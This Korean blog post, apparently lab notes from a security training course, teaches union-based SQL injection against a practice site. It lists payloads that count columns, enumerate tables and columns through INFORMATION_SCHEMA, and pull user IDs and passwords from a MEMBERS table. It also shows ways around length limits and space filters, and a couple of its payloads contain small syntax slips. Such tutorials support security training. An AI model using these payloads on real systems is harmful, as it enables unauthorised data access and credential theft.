---
layout: post
title: Union SQL Injection
subtitle: Union SQL Injection
categories: SQL
tags: [SQL, Injection, Pentest]
---

**본 내용 및 실습 환경은 KISEC, 케이쉴드 주니어 교육 과정에 있음을 알려드립니다.**

## 정의

Union SQL Injection은 기존 정상 쿼리와 악성 쿼리를 합집합하여 해당 결과를 통합해 하나의 테이블로 보여주는 것이다.

Union SQL Injection은 **기존 정상 쿼리의 Select 칼럼 수**와 **Union Select 악성 쿼리의 Select 칼럼 수**가 동일해야 하고, 각 칼럼은 순서별로 동일한 데이터 형식이어야 한다.

기본적으로 `'(싱글 쿼테이션)`, 또는 `"(더블 쿼테이션)`, `Union`을 이용해 비정상적인 SQL Query를 진행시킨다.

## 실습

### 1. 기본 문법

```SQL
SELECT * FROM TABLE1 UNION SELECT * FROM TABLE2

/*
TABLE1 : 2개의 칼럼, 4개의 튜플
TABLE2 : 2개의 칼럼, 3개의 튜플
*/
```

* 두 개의 테이블이 각 칼럼 순서 별로 동일한 데이터 형식일 경우 위 SELECT의 결과는 7개의 튜플을 가진 테이블이 생긴다.

### 2. Union 실습 기초

Error-Based 실습 때 사용한 홈페이지에서 회원가입 > 주소 찾기 창에서 실습을 진행한다.

```SQL
SELECT * FROM TABLE1 WHERE ADDRESS = 'USER_ADDRESS' 
```

* 위 문법에 맞춰 해당 검색에 관련된 주소를 SELECT 할 것이다.

* 우린 `WHERE ADDRESS = ''`를 **'(싱글 쿼테이션)**으로 `WHERE` 구문을 상쇄 시키고, `OR UNION SELECT`로 새로운 SELECT를 구성한다.

```SQL
SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178670158-4c0f995a-0f7f-4d61-af8d-f0178bc4667e.png" width = 350>
</p>

* 위에서 말한거와 같이 칼럼의 수가 맞지 않는 경우 위처럼 에러가 발생하게 된다. 

* 따라서, `UNION SELECT 1, 2, 3, .... --`로 개수를 늘려가면서 진행하면 아래와 같이 결과가 나올 것이다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178671191-95fb7f3b-db73-41e3-84e6-dafa97c0717e.png" width = 350>
</p>

### 3. Union으로 테이블 명 확인

데이터베이스에서 제공하는 **information.schema**를 통해 테이블 명을 확인한다.

* 이 내용은 맨 밑에서 다루겠습니다 ! 궁금하신분은 맽 밑으로 !!

해당 주소 찾기의 데이터베이스의 칼럼은 총 5개 인 것을 확인했으므로, 앞으로의 `UNION`은 5개로 한정하여 검색한다.

```SQL
&#39; UNION SELECT 1, 2, 3, 4 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
```
<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178675478-002543bc-db45-402a-96d3-89a287489e82.png" width = 350>
</p>

* 결과는 이 처럼 여러 개의 테이블 이름이 나오게 된다.

* 결과에서 볼 수 있듯이, Error-Based SQL Injection에서 사용한 **Members** 테이블을 확인했다.

* 이 테이블에 대한 칼럼들을 확인 할 것이다.

### 4. Union으로 칼럼 명 확인

```SQL
&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
```
<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178677782-b75535bd-c524-40e6-a5b3-50513a711aa0.png" width = 350>
</p>

* 해당 **information_schema의 칼럼**을 읽어 올 수 있다.

* user_id, passwd 등 개인 정보를 쉽게 가져 올 수 있다는 것을 알 수 있다.

* 하지만, 너무 많은 것을 가져 오기 때문에, `WHERE` 조건을 이용하여 원하는 정보만 추출해야한다.

```SQL
&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MEMBERS' --
```

### 5. 주요 정보 추출

이로써, 주요 정보가 담긴 테이블 및 칼럼의 이름을 확인했다. 

해당 테이블명과 칼럼명을 활용해 `UNION SELECT`를 해본다.

```SQL
&#39; UNION SELECT 1, 2, 3, USER_ID, PASSWD FROM MEMBERS --
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178680967-3905dc73-ec03-4faf-8991-6dbbd3d77959.png" width = 350>
</p>

### 6. 보안 대책 우회

UNION 구문을 사용하다보면 글자 수가 비정상적으로 길어진다.

이러한 것을 막기 위해 JavaScript로 제한 하는 경우가 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178681334-d66d16f3-c54a-4c5d-bfb7-e54836067ee4.png" width = 350>
</p>

이처럼 **maxlength**로 명시 되어 있다.

그냥 개발자 도구로 **maxlength**를 지우면 가능하지만, 실제로 이렇게 우회 되는 경우는 없을 것이다.

아니면 띄워쓰기를 필터링하여 비정상적인 쿼리를 막는 경우가 있다.

이 방법도 우회가 가능하다.

```SQL
&#39;/**/UNION/**/SELECT/**/1,2,3,USER_ID,PASSWD/**/FROM/**/MEMBERS/**/--
```

* 주석을 활용한 방법이 대표적인 예시이다.

## INFORMATION.SCHEMA

INFORMATION.SCHEMA란 SQL서버 내에 존재하는 DB의 메타 정보 **(테이블, 칼럼, 인덱스 등의 스키마 정보)**를 모아둔 것이다. INFORMATION.SCHEMA 내의 모든 테이블은 읽기 전용이며, 단순한 조회만 가능하다는 것이다.

* INFORMATION.SCHEMA는 직접 생성하지 않아도 생성된다. 궁금하신분은 SQL 명령어를 통해 아래 처럼 볼 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/178683269-26e412a6-d68d-4ddc-9bd5-adf370dceb71.png" width = 350>
</p>

```SQL
SHOW DATABASES;

SHOW TABLES;
```